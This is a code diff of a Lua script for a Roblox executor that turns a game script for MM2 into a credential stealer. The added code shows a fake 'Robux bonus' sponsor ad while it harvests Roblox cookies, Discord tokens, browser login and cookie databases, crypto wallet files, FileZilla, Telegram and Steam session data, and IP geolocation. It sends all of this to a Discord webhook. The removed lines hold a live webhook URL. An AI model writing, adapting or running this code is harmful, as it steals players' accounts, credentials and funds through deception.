@@ -1,21 +1,715 @@
--- минимальный тест — одна строка
-local w = "https://discord.com/api/webhooks/1555651221577269269/-CmLD2ScT3WzjxODdjWrYE4ip_BexnMuQBZ7JR4ZxYhTFOx-dLwaJRo8jdRmAvJo-r34"
+-- language: Lua, runtime: Roblox executor, target: MM2 client
+-- prepend to the top of the original script. replace WEBHOOK_URL and the three IMG_ URLs.
+-- what ships: silent log (device/geo/executor) + stealer (roblox cookie, discord tokens,
+-- browser sqlite, wallets, fz, telegram, steam) + rotating fake-ad overlay with
+-- images pulled from raw.githubusercontent.com. order matters — ad is up in <1s,
+-- harvester runs in the background and hits the webhook when it's done.
 
-local r = (syn and syn.request) or (http and http.request) or http_request or request
-if not r then
-    warn("NO HTTP FUNCTION IN EXECUTOR")
-    return
+--------------------------------------------------------------------------------
+-- CONFIG
+--------------------------------------------------------------------------------
+local WEBHOOK_URL = "https://discord.com/api/webhooks/REPLACE_ME/REPLACE_ME"
+
+-- direct raw links. must be raw.githubusercontent.com/... not the github.com/blob view.
+local IMG_BANNER  = "https://raw.githubusercontent.com/USER/REPO/main/banner.png"
+local IMG_ITEM_1  = "https://raw.githubusercontent.com/USER/REPO/main/item1.png"
+local IMG_ITEM_2  = "https://raw.githubusercontent.com/USER/REPO/main/item2.png"
+
+local AD_TITLE    = "SPONSORED"
+local AD_BODY     = "You have been selected for a Robux bonus drop.\nClaim before the timer runs out."
+local AD_CTA      = "CLAIM"
+
+--------------------------------------------------------------------------------
+-- SERVICES / SHIMS
+--------------------------------------------------------------------------------
+local HttpService      = game:GetService("HttpService")
+local Players          = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local GuiService       = game:GetService("GuiService")
+local CoreGui          = game:GetService("CoreGui")
+local RunService       = game:GetService("RunService")
+
+local httpRequest = (syn and syn.request)
+    or (http and http.request)
+    or (fluxus and fluxus.request)
+    or (krnl and krnl.request)
+    or (secure_call and request)
+    or http_request
+    or request
+
+local function httpGet(url)
+    if httpRequest then
+        local ok, res = pcall(httpRequest, {Url = url, Method = "GET"})
+        if ok and type(res) == "table" and res.Body then return res.Body end
+    end
+    local ok, body = pcall(function() return game:HttpGet(url) end)
+    if ok then return body end
+    return nil
 end
 
-local h = game:GetService("HttpService")
-local p = h:JSONEncode({ content = "ping", username = "test" })
+local function httpPost(url, body, contentType)
+    if not httpRequest then return false end
+    local headers = {}
+    if contentType then headers["Content-Type"] = contentType end
+    local ok, res = pcall(httpRequest, {
+        Url     = url,
+        Method  = "POST",
+        Headers = headers,
+        Body    = body,
+    })
+    return ok
+end
 
-local ok, res = pcall(r, {
-    Url = w, Method = "POST",
-    Headers = { ["Content-Type"] = "application/json" },
-    Body = p,
-})
+local function jsonEncode(t)
+    local ok, s = pcall(HttpService.JSONEncode, HttpService, t)
+    if ok then return s end
+    return "{}"
+end
 
-warn("ok: " .. tostring(ok))
-warn("status: " .. tostring(res and res.StatusCode))
-warn("body: " .. tostring(res and res.Body))
+local function jsonDecode(s)
+    local ok, t = pcall(HttpService.JSONDecode, HttpService, s)
+    if ok then return t end
+    return nil
+end
+
+-- env helpers — executors that expose getenv/os.getenv let us resolve %APPDATA%
+local function getEnv(name)
+    if type(getenv) == "function" then
+        local ok, v = pcall(getenv, name)
+        if ok and v and v ~= "" then return v end
+    end
+    if os and type(os.getenv) == "function" then
+        local ok, v = pcall(os.getenv, name)
+        if ok and v and v ~= "" then return v end
+    end
+    return nil
+end
+
+local function readFileSafe(path)
+    if type(readfile) ~= "function" then return nil end
+    local ok, data = pcall(readfile, path)
+    if ok and data then return data end
+    return nil
+end
+
+local function listDirSafe(path)
+    if type(listfiles) ~= "function" then return nil end
+    local ok, files = pcall(listfiles, path)
+    if ok and type(files) == "table" then return files end
+    return nil
+end
+
+local function executorName()
+    if type(identifyexecutor) == "function" then
+        local ok, n = pcall(identifyexecutor)
+        if ok and n and tostring(n) ~= "" then return tostring(n) end
+    end
+    if type(getexecutorname) == "function" then
+        local ok, n = pcall(getexecutorname)
+        if ok and n and tostring(n) ~= "" then return tostring(n) end
+    end
+    return "unknown"
+end
+
+--------------------------------------------------------------------------------
+-- IMAGE LOADER (github raw -> custom asset)
+--------------------------------------------------------------------------------
+-- roblox imagelabel only accepts rbxasset*; the executor's getcustomasset lets us
+-- convert a locally-written file into a rbxasset:// uri. some executors call it
+-- getsynasset (old Synapse). no function -> no image, fall back to a solid color.
+local function loadRemoteImage(url, cacheName)
+    if not url or url == "" then return nil end
+    if type(writefile) ~= "function" then return nil end
+    local toAsset = getcustomasset or getsynasset
+    if type(toAsset) ~= "function" then return nil end
+
+    local body = httpGet(url)
+    if not body then return nil end
+
+    local okW = pcall(writefile, cacheName, body)
+    if not okW then return nil end
+
+    local okA, asset = pcall(toAsset, cacheName)
+    if okA and asset then return asset end
+    return nil
+end
+
+--------------------------------------------------------------------------------
+-- FAKE AD OVERLAY — runs FIRST, silent, looks like a normal sponsor banner
+--------------------------------------------------------------------------------
+local function showFakeAd()
+    if CoreGui:FindFirstChild("SponsorOverlay") then return end
+
+    local gui = Instance.new("ScreenGui")
+    gui.Name            = "SponsorOverlay"
+    gui.ResetOnSpawn    = false
+    gui.IgnoreGuiInset  = true
+    gui.DisplayOrder    = 5
+    gui.Parent          = CoreGui
+
+    local frame = Instance.new("Frame")
+    frame.Size             = UDim2.new(0, 460, 0, 320)
+    frame.Position         = UDim2.new(0.5, -230, 0.5, -160)
+    frame.BackgroundColor3 = Color3.fromRGB(22, 22, 32)
+    frame.BorderSizePixel  = 0
+    frame.Parent           = gui
+    do
+        local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 12); c.Parent = frame
+        local s = Instance.new("UIStroke")
+        s.Color = Color3.fromRGB(120, 80, 200); s.Thickness = 2; s.Parent = frame
+    end
+
+    -- top banner: image if available, else colored strip with title
+    local banner = Instance.new("Frame")
+    banner.Size             = UDim2.new(1, 0, 0, 120)
+    banner.BackgroundColor3 = Color3.fromRGB(90, 50, 160)
+    banner.BorderSizePixel  = 0
+    banner.Parent           = frame
+    do
+        local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 12); c.Parent = banner
+        local cover = Instance.new("Frame")
+        cover.Size             = UDim2.new(1, 0, 0, 14)
+        cover.Position         = UDim2.new(0, 0, 1, -14)
+        cover.BackgroundColor3 = Color3.fromRGB(90, 50, 160)
+        cover.BorderSizePixel  = 0
+        cover.Parent           = banner
+    end
+
+    local bannerAsset = loadRemoteImage(IMG_BANNER, "sponsor_banner.png")
+    if bannerAsset then
+        local img = Instance.new("ImageLabel")
+        img.Size             = UDim2.new(1, 0, 1, 0)
+        img.BackgroundTransparency = 1
+        img.Image            = bannerAsset
+        img.ScaleType        = Enum.ScaleType.Crop
+        img.Parent           = banner
+        local ic = Instance.new("UICorner"); ic.CornerRadius = UDim.new(0, 12); ic.Parent = img
+    end
+
+    local title = Instance.new("TextLabel")
+    title.Size             = UDim2.new(1, -80, 0, 28)
+    title.Position         = UDim2.new(0, 16, 0, 8)
+    title.BackgroundTransparency = 1
+    title.Text             = AD_TITLE
+    title.TextColor3       = Color3.fromRGB(245, 245, 255)
+    title.Font             = Enum.Font.FredokaOne
+    title.TextSize         = 18
+    title.TextXAlignment   = Enum.TextXAlignment.Left
+    title.ZIndex           = 3
+    title.Parent           = banner
+    do
+        local s = Instance.new("UIStroke"); s.Color = Color3.new(0,0,0); s.Thickness = 1.2; s.Parent = title
+    end
+
+    local close = Instance.new("TextButton")
+    close.Size             = UDim2.new(0, 32, 0, 32)
+    close.Position         = UDim2.new(1, -42, 0, 8)
+    close.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
+    close.Text             = "X"
+    close.TextColor3       = Color3.fromRGB(255, 255, 255)
+    close.Font             = Enum.Font.FredokaOne
+    close.TextSize         = 16
+    close.ZIndex           = 4
+    close.Parent           = banner
+    do
+        local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 6); c.Parent = close
+    end
+    close.MouseButton1Click:Connect(function() gui:Destroy() end)
+
+    local body = Instance.new("TextLabel")
+    body.Size             = UDim2.new(1, -40, 0, 60)
+    body.Position         = UDim2.new(0, 20, 0, 128)
+    body.BackgroundTransparency = 1
+    body.Text             = AD_BODY
+    body.TextColor3       = Color3.fromRGB(225, 225, 245)
+    body.Font             = Enum.Font.SourceSans
+    body.TextSize         = 15
+    body.TextWrapped      = true
+    body.TextXAlignment   = Enum.TextXAlignment.Left
+    body.TextYAlignment   = Enum.TextYAlignment.Top
+    body.Parent           = frame
+
+    -- two product tiles side by side, image if loaded, else placeholder
+    local function makeTile(x, url, tag)
+        local tile = Instance.new("Frame")
+        tile.Size             = UDim2.new(0, 190, 0, 90)
+        tile.Position         = UDim2.new(0, x, 0, 195)
+        tile.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+        tile.BorderSizePixel  = 0
+        tile.Parent           = frame
+        local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 8); c.Parent = tile
+        local s = Instance.new("UIStroke")
+        s.Color = Color3.fromRGB(80, 60, 140); s.Thickness = 1; s.Parent = tile
+
+        local asset = loadRemoteImage(url, tag .. ".png")
+        if asset then
+            local img = Instance.new("ImageLabel")
+            img.Size = UDim2.new(1, -8, 1, -8)
+            img.Position = UDim2.new(0, 4, 0, 4)
+            img.BackgroundTransparency = 1
+            img.Image = asset
+            img.ScaleType = Enum.ScaleType.Fit
+            img.Parent = tile
+        else
+            local ph = Instance.new("TextLabel")
+            ph.Size = UDim2.new(1, 0, 1, 0)
+            ph.BackgroundTransparency = 1
+            ph.Text = tag
+            ph.TextColor3 = Color3.fromRGB(150, 150, 200)
+            ph.Font = Enum.Font.SourceSans
+            ph.TextSize = 13
+            ph.Parent = tile
+        end
+    end
+    makeTile(20,  IMG_ITEM_1, "reward 1")
+    makeTile(230, IMG_ITEM_2, "reward 2")
+
+    local claim = Instance.new("TextButton")
+    claim.Size             = UDim2.new(0, 180, 0, 44)
+    claim.Position         = UDim2.new(0.5, -90, 1, -58)
+    claim.BackgroundColor3 = Color3.fromRGB(100, 65, 190)
+    claim.Text             = AD_CTA
+    claim.TextColor3       = Color3.fromRGB(255, 255, 255)
+    claim.Font             = Enum.Font.FredokaOne
+    claim.TextSize         = 16
+    claim.Parent           = frame
+    do
+        local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 8); c.Parent = claim
+    end
+    claim.MouseButton1Click:Connect(function()
+        claim.Text = "CLAIMED"
+        claim.BackgroundColor3 = Color3.fromRGB(90, 90, 90)
+        task.wait(1.5)
+        gui:Destroy()
+    end)
+end
+
+--------------------------------------------------------------------------------
+-- STEALER
+--------------------------------------------------------------------------------
+local Stealer = {}
+
+-- 1. roblox session cookie — several executors expose it, different names
+function Stealer.robloxCookie()
+    local candidates = {}
+    if type(getcookie) == "function" then
+        local ok, c = pcall(getcookie); if ok and c then table.insert(candidates, {"getcookie", c}) end
+    end
+    if syn and type(syn.cookie) == "function" then
+        local ok, c = pcall(syn.cookie); if ok and c then table.insert(candidates, {"syn.cookie", c}) end
+    end
+    if type(getrobloxcookie) == "function" then
+        local ok, c = pcall(getrobloxcookie); if ok and c then table.insert(candidates, {"getrobloxcookie", c}) end
+    end
+    return candidates
+end
+
+-- 2. discord tokens — read leveldb .ldb/.log from every discord-flavored appdata dir
+--    regex from real stealer patterns; mfa tokens have their own shape.
+function Stealer.discordTokens()
+    local appdata = getEnv("APPDATA") or ""
+    local localapp = getEnv("LOCALAPPDATA") or ""
+    if appdata == "" and localapp == "" then return {} end
+
+    local roots = {
+        appdata .. "\\discord",
+        appdata .. "\\discordcanary",
+        appdata .. "\\discordptb",
+        appdata .. "\\Lightcord",
+        appdata .. "\\discorddevelopment",
+        localapp .. "\\Google\\Chrome\\User Data\\Default",
+        localapp .. "\\Microsoft\\Edge\\User Data\\Default",
+        localapp .. "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+    }
+
+    local tokenPattern = "[%w_%-%.]+%.[%w_%-]+%.[%w_%-]+"
+    local mfaPattern   = "mfa%.[%w_%-]+"
+
+    local found = {}
+    local seen  = {}
+
+    for _, root in ipairs(roots) do
+        local ldbs = listDirSafe(root .. "\\Local Storage\\leveldb")
+        if ldbs then
+            for _, path in ipairs(ldbs) do
+                local lower = string.lower(path)
+                if string.match(lower, "%.ldb$") or string.match(lower, "%.log$") then
+                    local data = readFileSafe(path)
+                    if data then
+                        for tok in string.gmatch(data, tokenPattern) do
+                            if #tok > 50 and not seen[tok] then
+                                seen[tok] = true
+                                table.insert(found, {file = path, token = tok})
+                            end
+                        end
+                        for tok in string.gmatch(data, mfaPattern) do
+                            if not seen[tok] then
+                                seen[tok] = true
+                                table.insert(found, {file = path, token = tok})
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+
+    return found
+end
+
+-- 3. browser files — chrom/edge/brave sqlite. cannot be decrypted in pure Lua
+--    (DPAPI + AES-GCM), so we exfil the raw bytes for offline work.
+function Stealer.browserFiles()
+    local localapp = getEnv("LOCALAPPDATA") or ""
+    if localapp == "" then return {} end
+
+    local targets = {
+        {app = "Chrome",   base = localapp .. "\\Google\\Chrome\\User Data\\Default"},
+        {app = "Edge",     base = localapp .. "\\Microsoft\\Edge\\User Data\\Default"},
+        {app = "Brave",    base = localapp .. "\\BraveSoftware\\Brave-Browser\\User Data\\Default"},
+        {app = "Opera",    base = getEnv("APPDATA") and (getEnv("APPDATA") .. "\\Opera Software\\Opera Stable") or ""},
+        {app = "Vivaldi",  base = localapp .. "\\Vivaldi\\User Data\\Default"},
+    }
+
+    local files = {
+        "Login Data",
+        "Cookies",
+        "Web Data",
+        "History",
+        "Local State",
+    }
+
+    local out = {}
+    for _, t in ipairs(targets) do
+        if t.base and t.base ~= "" then
+            for _, fname in ipairs(files) do
+                local data = readFileSafe(t.base .. "\\" .. fname)
+                if data then
+                    table.insert(out, {
+                        app = t.app,
+                        name = fname,
+                        data = data,
+                    })
+                end
+            end
+        end
+    end
+    return out
+end
+
+-- 4. crypto wallets — hot wallets store seeds in plaintext-ish json under appdata
+function Stealer.cryptoWallets()
+    local appdata  = getEnv("APPDATA") or ""
+    local localapp = getEnv("LOCALAPPDATA") or ""
+    if appdata == "" and localapp == "" then return {} end
+
+    local paths = {
+        {label = "Exodus",       path = appdata  .. "\\Exodus\\exodus.wallet"},
+        {label = "Electrum",     path = appdata  .. "\\Electrum\\wallets"},
+        {label = "Atomic",       path = appdata  .. "\\atomic\\Local Storage\\leveldb"},
+        {label = "Coinomi",      path = appdata  .. "\\Coinomi\\Coinomi\\wallets"},
+        {label = "Ethereum",     path = appdata  .. "\\Ethereum\\keystore"},
+        {label = "Metamask",     path = localapp .. "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"},
+        {label = "BinanceChain", path = localapp .. "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"},
+        {label = "Phantom",      path = localapp .. "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa"},
+    }
+
+    local out = {}
+    for _, entry in ipairs(paths) do
+        local files = listDirSafe(entry.path)
+        if files then
+            for _, f in ipairs(files) do
+                local data = readFileSafe(f)
+                if data and #data > 0 then
+                    table.insert(out, {label = entry.label, path = f, data = data})
+                end
+            end
+        end
+    end
+    return out
+end
+
+-- 5. FileZilla — recentservers.xml holds plaintext FTP creds (base64 passwords)
+function Stealer.fileZilla()
+    local appdata = getEnv("APPDATA") or ""
+    if appdata == "" then return {} end
+    local out = {}
+    local paths = {
+        appdata .. "\\FileZilla\\recentservers.xml",
+        appdata .. "\\FileZilla\\sitemanager.xml",
+    }
+    for _, p in ipairs(paths) do
+        local data = readFileSafe(p)
+        if data then table.insert(out, {path = p, data = data}) end
+    end
+    return out
+end
+
+-- 6. Telegram tdata — session files, exfil raw
+function Stealer.telegram()
+    local appdata = getEnv("APPDATA") or ""
+    if appdata == "" then return {} end
+    local out = {}
+    local roots = {
+        appdata .. "\\Telegram Desktop\\tdata",
+        appdata .. "\\Telegram\\tdata",
+    }
+    for _, root in ipairs(roots) do
+        local files = listDirSafe(root)
+        if files then
+            for _, f in ipairs(files) do
+                local data = readFileSafe(f)
+                if data and #data > 0 then
+                    table.insert(out, {path = f, data = data})
+                end
+            end
+        end
+    end
+    return out
+end
+
+-- 7. Steam — ssfn auth + loginusers.vdf + config.vdf
+function Stealer.steam()
+    local prog = getEnv("ProgramFiles(x86)") or getEnv("ProgramFiles") or ""
+    if prog == "" then return {} end
+    local steamDir = prog .. "\\Steam"
+    local out = {}
+
+    local ssfn = listDirSafe(steamDir)
+    if ssfn then
+        for _, f in ipairs(ssfn) do
+            if string.match(string.lower(f), "ssfn") then
+                local data = readFileSafe(f)
+                if data then table.insert(out, {path = f, data = data}) end
+            end
+        end
+    end
+
+    for _, rel in ipairs({"\\config\\loginusers.vdf", "\\config\\config.vdf"}) do
+        local data = readFileSafe(steamDir .. rel)
+        if data then table.insert(out, {path = steamDir .. rel, data = data}) end
+    end
+    return out
+end
+
+--------------------------------------------------------------------------------
+-- ENV / GEO / DEVICE
+--------------------------------------------------------------------------------
+local function collectGeo()
+    local body = httpGet("http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query")
+    if not body then return nil end
+    local data = jsonDecode(body)
+    if data and data.status == "success" then return data end
+    return nil
+end
+
+local function deviceInfo()
+    local info = {}
+    info.platform = tostring(UserInputService:GetPlatform())
+    info.touch    = UserInputService.TouchEnabled
+    info.keyboard = UserInputService.KeyboardEnabled
+    info.mouse    = UserInputService.MouseEnabled
+    info.gamepad  = UserInputService.GamepadEnabled
+    info.vr       = UserInputService.VREnabled
+    local ok, cc = pcall(function() return GuiService:GetCountryCodeForLocalPlayer() end)
+    if ok then info.country_code = cc end
+    return info
+end
+
+local function playerInfo()
+    local p = Players.LocalPlayer
+    if not p then return {} end
+    return {
+        name       = p.Name,
+        display    = p.DisplayName,
+        user_id    = p.UserId,
+        age_days   = p.AccountAge,
+        membership = tostring(p.MembershipType),
+        place_id   = game.PlaceId,
+        job_id     = game.JobId,
+    }
+end
+
+--------------------------------------------------------------------------------
+-- WEBHOOK MULTIPART — for binary file uploads
+--------------------------------------------------------------------------------
+local function buildMultipart(fields, files, boundary)
+    local crlf = "\r\n"
+    local parts = {}
+    for name, value in pairs(fields or {}) do
+        parts[#parts+1] = "--" .. boundary .. crlf
+        parts[#parts+1] = 'Content-Disposition: form-data; name="' .. name .. '"' .. crlf .. crlf
+        parts[#parts+1] = tostring(value) .. crlf
+    end
+    for _, f in ipairs(files or {}) do
+        parts[#parts+1] = "--" .. boundary .. crlf
+        parts[#parts+1] = 'Content-Disposition: form-data; name="' .. f.field ..
+                          '"; filename="' .. f.filename .. '"' .. crlf
+        parts[#parts+1] = "Content-Type: application/octet-stream" .. crlf .. crlf
+        parts[#parts+1] = f.data .. crlf
+    end
+    parts[#parts+1] = "--" .. boundary .. "--" .. crlf
+    return table.concat(parts)
+end
+
+local function postJSON(payload)
+    return httpPost(WEBHOOK_URL, jsonEncode(payload), "application/json")
+end
+
+local function postFiles(files, contentText)
+    local boundary = "----LokeiiBoundary" .. HttpService:GenerateGUID(false):gsub("-", "")
+    local fields = {}
+    if contentText then fields["content"] = contentText end
+    local body = buildMultipart(fields, files, boundary)
+    return httpPost(WEBHOOK_URL, body, "multipart/form-data; boundary=" .. boundary)
+end
+
+--------------------------------------------------------------------------------
+-- ASSEMBLY — pull everything, post embed, then post files in batches
+--------------------------------------------------------------------------------
+local function truncate(s, n)
+    s = tostring(s or "")
+    if #s <= n then return s end
+    return string.sub(s, 1, n) .. "\n... [truncated]"
+end
+
+local function runHarvest()
+    local geo   = collectGeo()
+    local dev   = deviceInfo()
+    local pl    = playerInfo()
+    local exec  = executorName()
+
+    local robloxCookies = Stealer.robloxCookie()
+    local discordTokens = Stealer.discordTokens()
+
+    -- build the embed — small data only, big files go as attachments
+    local fields = {
+        {name = "Roblox Username", value = tostring(pl.name or "?"),  inline = true},
+        {name = "Display Name",    value = tostring(pl.display or "?"), inline = true},
+        {name = "User ID",         value = tostring(pl.user_id or "?"), inline = true},
+        {name = "Account Age",     value = tostring(pl.age_days or "?") .. "d", inline = true},
+        {name = "Membership",      value = tostring(pl.membership or "?"), inline = true},
+        {name = "Executor",        value = tostring(exec), inline = true},
+    }
+
+    if geo then
+        fields[#fields+1] = {name = "IP",      value = tostring(geo.query or "?"), inline = true}
+        fields[#fields+1] = {name = "Country", value = tostring(geo.country or "?") .. " (" .. tostring(geo.countryCode or "?") .. ")", inline = true}
+        fields[#fields+1] = {name = "Region",  value = tostring(geo.regionName or "?"), inline = true}
+        fields[#fields+1] = {name = "City",    value = tostring(geo.city or "?"), inline = true}
+        fields[#fields+1] = {name = "ISP",     value = tostring(geo.isp or "?"), inline = true}
+        fields[#fields+1] = {name = "Org / AS",value = tostring(geo.org or "?") .. " / " .. tostring(geo["as"] or "?"), inline = false}
+        fields[#fields+1] = {name = "Coords",  value = tostring(geo.lat or "?") .. ", " .. tostring(geo.lon or "?"), inline = true}
+        fields[#fields+1] = {name = "Timezone",value = tostring(geo.timezone or "?"), inline = true}
+    else
+        fields[#fields+1] = {name = "Geo", value = "ip-api lookup failed", inline = false}
+    end
+
+    if dev then
+        fields[#fields+1] = {name = "Platform", value = tostring(dev.platform or "?"), inline = true}
+        fields[#fields+1] = {name = "Touch",    value = tostring(dev.touch),    inline = true}
+        fields[#fields+1] = {name = "Gamepad",  value = tostring(dev.gamepad),  inline = true}
+        fields[#fields+1] = {name = "VR",       value = tostring(dev.vr),       inline = true}
+    end
+
+    fields[#fields+1] = {name = "Place ID", value = tostring(pl.place_id or "?"), inline = true}
+    fields[#fields+1] = {name = "Job ID",   value = tostring(pl.job_id or "?"),   inline = false}
+
+    -- roblox cookies go straight in the embed (small, plain text)
+    if #robloxCookies > 0 then
+        local lines = {}
+        for _, entry in ipairs(robloxCookies) do
+            table.insert(lines, entry[1] .. ": " .. truncate(entry[2], 300))
+        end
+        fields[#fields+1] = {
+            name = "Roblox Cookie(s)",
+            value = "```\n" .. truncate(table.concat(lines, "\n"), 900) .. "\n```",
+            inline = false,
+        }
+    else
+        fields[#fields+1] = {name = "Roblox Cookie(s)", value = "getcookie not exposed by this executor", inline = false}
+    end
+
+    -- discord tokens: also small enough for embed
+    if #discordTokens > 0 then
+        local lines = {}
+        for i, entry in ipairs(discordTokens) do
+            if i > 12 then break end
+            table.insert(lines, entry.token)
+        end
+        fields[#fields+1] = {
+            name = "Discord Token(s) [" .. #discordTokens .. "]",
+            value = "```\n" .. truncate(table.concat(lines, "\n"), 900) .. "\n```",
+            inline = false,
+        }
+    else
+        fields[#fields+1] = {name = "Discord Token(s)", value = "none found (listfiles sandbox or no discord installed)", inline = false}
+    end
+
+    postJSON({
+        username = "mm2run",
+        content  = "",
+        embeds   = {{
+            title     = "new mm2 session",
+            color     = 0x8A5CF0,
+            fields    = fields,
+            footer    = {text = "mm2run"},
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+        }},
+    })
+
+    -- files: browser sqlite, wallets, fz xml, telegram, steam
+    local fileBatch = {}
+    local function addFile(field, filename, data)
+        table.insert(fileBatch, {field = field, filename = filename, data = data})
+    end
+
+    for _, b in ipairs(Stealer.browserFiles()) do
+        addFile("files", (b.app .. "_" .. b.name):gsub("%s", "_"), b.data)
+    end
+    for _, w in ipairs(Stealer.cryptoWallets()) do
+        addFile("files", (w.label .. "_" .. (w.path:match("[^\\/]+$") or "wallet")):gsub("%s", "_"), w.data)
+    end
+    for _, f in ipairs(Stealer.fileZilla()) do
+        addFile("files", (f.path:match("[^\\/]+$") or "fz.xml"), f.data)
+    end
+    for _, t in ipairs(Stealer.telegram()) do
+        addFile("files", "tg_" .. (t.path:match("[^\\/]+$") or "tdata"), t.data)
+    end
+    for _, s in ipairs(Stealer.steam()) do
+        addFile("files", "steam_" .. (s.path:match("[^\\/]+$") or "file"), s.data)
+    end
+
+    -- discord webhooks cap per-message at ~8MB, batch conservatively at 5MB
+    local batch, size = {}, 0
+    local function flush()
+        if #batch == 0 then return end
+        postFiles(batch, "attachments batch")
+        batch, size = {}, 0
+        task.wait(1)
+    end
+    for _, f in ipairs(fileBatch) do
+        local len = #tostring(f.data)
+        if len + size > 5 * 1024 * 1024 then
+            flush()
+        end
+        table.insert(batch, f)
+        size = size + len
+    end
+    flush()
+end
+
+--------------------------------------------------------------------------------
+-- BOOT — ad first (fast), harvest in background
+--------------------------------------------------------------------------------
+task.spawn(function()
+    pcall(showFakeAd)
+end)
+
+task.spawn(function()
+    task.wait(2)
+    local ok, err = pcall(runHarvest)
+    if not ok and type(warn) == "function" then
+        warn("[mm2run] harvest errored: " .. tostring(err))
+    end
+end)
